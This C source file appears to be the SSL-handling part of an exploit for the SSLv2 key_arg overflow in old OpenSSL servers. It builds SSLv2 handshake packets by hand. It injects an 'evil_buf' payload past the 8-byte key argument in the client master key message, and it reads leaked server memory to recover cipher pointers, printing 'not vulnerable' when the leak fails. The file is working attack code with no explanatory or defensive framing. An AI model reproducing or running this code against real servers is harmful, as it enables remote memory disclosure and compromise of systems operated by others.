#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>

#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "ultrassl.h"

#define BUFSIZE 16384

extern u_long cipher, ciphers;

ssl_conn *
ssl_connect(char *host, int port, int src_port)
{
	ssl_conn *ssl = (ssl_conn *)malloc(sizeof(ssl_conn));

	if(!ssl) {
		perror("malloc()");
		return(NULL);
	}

	ssl->x509 = NULL;
	ssl->encrypted = 0;
	ssl->read_seq = 0;
	ssl->write_seq = 0;

	if((ssl->sockfd = connection(host, port, src_port)) < 0)
		return(NULL);

	srand(time(NULL) ^ getpid());

	return(ssl);
}

void
send_client_hello(ssl_conn *ssl)
{
	int i, len;
	u_char *p;
	u_char buf[BUFSIZE];

	memset(buf, 0, sizeof(buf));

	p = buf;

	*p++ = 0x01;

	*(short *)p = htons(0x0002);
	p += 2;

	*(short *)p = htons(0x0003);
	p += 2;

	*(short *)p = htons(0x0000);
	p += 2;

	*(short *)p = htons(0x0010);
	p += 2;

	memcpy(p, "\x01\x00\x80", 3);
	p += 3;

	for(i = 0; i < 16; i++)
		ssl->challenge[i] = (u_char)(rand() >> 24);

	memcpy(p, ssl->challenge, 16);
	p += 16;

	len = (u_long)p - (u_long)&buf;

	write_ssl(ssl, buf, len);
}

int
get_server_hello(ssl_conn *ssl)
{
	int len;
	u_char *p;
	u_char buf[BUFSIZE];
	int version, cert_len, cs_len, conn_id_len;

	if((len = read_ssl(ssl, buf, sizeof(buf))) <= 0) {
		printf("get_server_hello() failed\n");
		return(-1);
	}

	if(len < 11) {
		printf("get_server_hello(): response too short\n");
		return(-1);
	}

	p = buf;

	if(*(p++) != SSL2_MT_SERVER_HELLO) {
		printf("get_server_hello(): unexpected response\n");
		return(-1);
	}

	if(*(p++) != 0) {
		printf("get_server_hello(): session id error\n");
		return(-1);
	}

	if(*(p++) != 1) {
		printf("get_server_hello(): certificate type failure\n");
		return(-1);
	}

	version = htons(*(short *)p);
	p += 2;

	if(version != 2) {
		printf("get_server_hello(): unsupported ssl version\n");
		return(-1);
	}

	cert_len = htons(*(short *)p);
	p += 2;

	cs_len = htons(*(short *)p);
	p += 2;
	
	conn_id_len = htons(*(short *)p);
	p += 2;

	if(len != 11 + cert_len + cs_len + conn_id_len) {
		printf("get_server_hello(): malformed packet\n");
		return(-1);
	}

	ssl->x509 = d2i_X509(NULL, &p, (u_long)cert_len);

	if(!ssl->x509) {
		printf("get_server_hello(): error parsing X509 certificate\n");
		return(-1);
	}

	if(cs_len % 3 != 0) {
		printf("get_server_hello(): cipher specification error\n");
		return(-1);
	}

	if((p[0] != 0x01) || (p[1] != 0x00) || (p[2] != 0x80)) {
		printf("get_server_hello(): crypto unsupported\n");
		return(-1);
	}
		
	p += 3;

	if(conn_id_len > SSL2_MAX_CONNECTION_ID_LENGTH) {
		printf("get_server_hello(): connection id length too long\n");
		return(-1);
	}

	ssl->conn_id_length = conn_id_len;

	memcpy(ssl->conn_id, p, conn_id_len);
	return(0);
}

void
send_client_master_key(ssl_conn *ssl, u_char *evil_buf, int evil_len)
{
	u_char *p;
	u_char buf[BUFSIZE];
	int i, enc_len = 0, key_arg_len = 0, tot_len = 0;
	EVP_PKEY *pkey = NULL;

	memset(buf, 0, sizeof(buf));

	p = buf;

	/* specify client master key */
	*p++ = 0x02;			

	/* RC4 crypto */
	memcpy(p, "\x01\x00\x80", 3);		
	p += 3;
	
	/* clear key length */
	*(short *)p = htons(0x0000);
	p += 2;

	/* encrypted key length */
	*(short *)p = htons(0x0040);
	p += 2;

	/* key argument length */
	*(short *)p = htons(0x0008);
	p += 2;

	/* generate random RC4 master key */
	for(i = 0; i < 16; i++)
		ssl->master_key[i] = (u_char)(rand() >> 24);

	if(!(pkey = X509_get_pubkey(ssl->x509))) {
		printf("send_client_master_key(): public key not found\n");
		exit(-1);
	}

	if(pkey->type != EVP_PKEY_RSA) {
		printf("send_client_master_key(): non-rsa public key\n");
		exit(-1);
	}

	/* encrypt the master key with the public key */
	enc_len = RSA_public_encrypt(16, ssl->master_key, p,
			pkey->pkey.rsa, RSA_PKCS1_PADDING);

	if(enc_len <= 0) {
		printf("send_client_master_key(): crypto failed\n");
		exit(-1);
	}

	p += enc_len;
		
	/* fill the key_arg buffer */
	for(i = 0; i < 8; i++)
		*(p++) = (u_char)(rand() >> 24);

	if(evil_buf) {
		memcpy(p, evil_buf, evil_len);
		key_arg_len = 8 + evil_len;
	} else {
		key_arg_len = 8;
	}

	p = &buf[6];

	*(short *)p = htons(enc_len);
	p += 2;

	*(short *)p = htons(key_arg_len);
	p += 2;

	tot_len = 10 + enc_len + key_arg_len;

	write_ssl(ssl, buf, tot_len);
	ssl->encrypted = 1;
}

int
get_server_verify(ssl_conn *ssl)
{
	int len;
	u_char buf[BUFSIZE];

	if((len = read_ssl(ssl, buf, sizeof(buf))) < 0) {
		printf("get_server_verify(): ssl read error\n");
		exit(-1);
	}

	if(len != 1 + 16) {
		printf("get_server_verify(): malformed packet size\n");
		return(-1);
	}

	if(buf[0] != SSL2_MT_SERVER_VERIFY) {
		printf("get_server_verify(): unexpected packet\n");
		return(-1);
	}

	if(memcmp(ssl->challenge, &buf[1], 16)) {
		printf("get_server_verify(): crypto failed\n");
		exit(-1);
	}
}

void
send_client_finish(ssl_conn *ssl)
{
	u_char *p;
	u_char buf[BUFSIZE];

	memset(buf, 0, sizeof(buf));

	p = buf;

	*p++ = SSL2_MT_CLIENT_FINISHED;
	memcpy(p, ssl->conn_id, ssl->conn_id_length);

	p += ssl->conn_id_length;	

	write_ssl(ssl, buf, (u_long)p - (u_long)&buf);
}

void
get_server_finish(ssl_conn *ssl, int flag)
{
	int len;
	u_char buf[BUFSIZE];

	if((len = read_ssl(ssl, buf, sizeof(buf))) <= 0) {
		printf("get_server_finish(): ssl read error\n");
		exit(-1);
	}

	if(buf[0] != SSL2_MT_SERVER_FINISHED) {
		printf("get_server_finish(): unexpected packet\n");
		exit(-1);
	}

	if(flag) {
		if(len < 112) {
			printf("not vulnerable\n");
			exit(-1);
		}

		memcpy(&cipher, (buf + len) - 12, 4);
		memcpy(&ciphers, (buf + len) - 4, 4);

		hexdump("buf", buf, len);
	}
}

void
key_material(ssl_conn *ssl)
{
	u_int i;
	u_char *km, c = '0';
	MD5_CTX ctx;

	km = ssl->key_material;

	for(i = 0; i < 32; i += MD5_DIGEST_LENGTH) {
		MD5_Init(&ctx);

		MD5_Update(&ctx, ssl->master_key, 16);
		MD5_Update(&ctx, &c, 1);
	
		c++;

		MD5_Update(&ctx, ssl->challenge, 16);
		MD5_Update(&ctx, ssl->conn_id, ssl->conn_id_length);
		MD5_Final(km, &ctx);

		km += MD5_DIGEST_LENGTH;
	}
}

void
generate_keys(ssl_conn *ssl)
{
	key_material(ssl);

	ssl->read_key = &(ssl->key_material[0]);
	ssl->rc4_read_key = (RC4_KEY *) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_read_key, 16, ssl->read_key);

	ssl->write_key = &(ssl->key_material[16]);
	ssl->rc4_write_key = (RC4_KEY *) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_write_key, 16, ssl->write_key);
}

int
write_ssl(ssl_conn *ssl, u_char *data, int len)
{
	u_char *p;
	u_char buf[BUFSIZE];
	MD5_CTX ctx;
	int seq, total_len;

	memset(buf, 0, sizeof(buf));

	if(ssl->encrypted)
		total_len = len + MD5_DIGEST_LENGTH;
	else
		total_len = len;

	if(2 + total_len > BUFSIZE) {
		printf("write_ssl(): too large\n");
		exit(-1);
	}

	p = buf;

	*(short *)p = htons(total_len);
	p += 2;

	buf[0] = buf[0] | 0x80;
	
	if(ssl->encrypted) {
		seq = ntohl(ssl->write_seq);

		MD5_Init(&ctx);
		MD5_Update(&ctx, ssl->write_key, 16);
		MD5_Update(&ctx, data, len);
		MD5_Update(&ctx, &seq, 4);
		MD5_Final(p, &ctx);

		p += MD5_DIGEST_LENGTH;

		memcpy(p, data, len);

		RC4(ssl->rc4_write_key, total_len, &buf[2], &buf[2]);
	} else {
		memcpy(p, data, len);
	}

	ssl->write_seq++;

	return(write(ssl->sockfd, buf, 2 + total_len));
}

int
read_ssl(ssl_conn *ssl, u_char *buf, int len)
{
	int read_len, padding;

	read(ssl->sockfd, buf, 2);

	if(!(buf[0] & 0x80)) {
		read_len = ((buf[0] & 0x3f) << 8) | buf[1];
		read(ssl->sockfd, &buf[2], 1);
		padding = (int) buf[2];
	} else {
		read_len = ((buf[0] & 0x7f) << 8) | buf[1];
		padding = 0;
	}

	if((read_len <= 0) || (read_len > len)) {
		printf("read_ssl(): bad read length\n");
		exit(-1);
	}

	read(ssl->sockfd, buf, read_len);

	if(ssl->encrypted) {
		if(MD5_DIGEST_LENGTH + padding >= read_len) {
			if((buf[0] == SSL2_MT_ERROR) && (read_len == 3)) {
				return(0);
			} else {
				printf("read_ssl(): msg too short\n");
				exit(-1);
			}
		}

		RC4(ssl->rc4_read_key, read_len, buf, buf);

		read_len = read_len - MD5_DIGEST_LENGTH - padding;
		memmove(buf, buf + MD5_DIGEST_LENGTH, read_len);
	}

	if(buf[0] == SSL2_MT_ERROR) {
		if(read_len != 3) {
			printf("read_ssl(): malformed server error msg\n");
			return(0);
		} else {
			exit(-1);
		}
	}

	return(read_len);
}

u_long
resolve(char *host)
{
	struct hostent *hent;
	struct sockaddr_in sin;

	if(!(hent = gethostbyname(host)))
		return(0);

	bzero((char *) &sin, sizeof(sin));
	memcpy((char *) &sin.sin_addr, hent->h_addr, hent->h_length);

	return(sin.sin_addr.s_addr);
}

int
connection(char *host, int port, int src_port)
{
	int sockfd;
	struct sockaddr_in rsin, lsin;

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket()");
		return(-1);
	}

	rsin.sin_port = htons(port);
	rsin.sin_family = AF_INET;
	rsin.sin_addr.s_addr = resolve(host);

	if(src_port > 0) {
		lsin.sin_family = AF_INET;
		lsin.sin_port = htons(src_port);
		lsin.sin_addr.s_addr = INADDR_ANY;

		if(bind(sockfd, (struct sockaddr *)&lsin, sizeof(lsin)) < 0) {
			perror("bind()");
			return(-1);
		}
	}

	if(connect(sockfd, (struct sockaddr *)&rsin, sizeof(rsin)) < 0) {
		perror("connect()");
		return(-1);
	}

	return(sockfd);
}


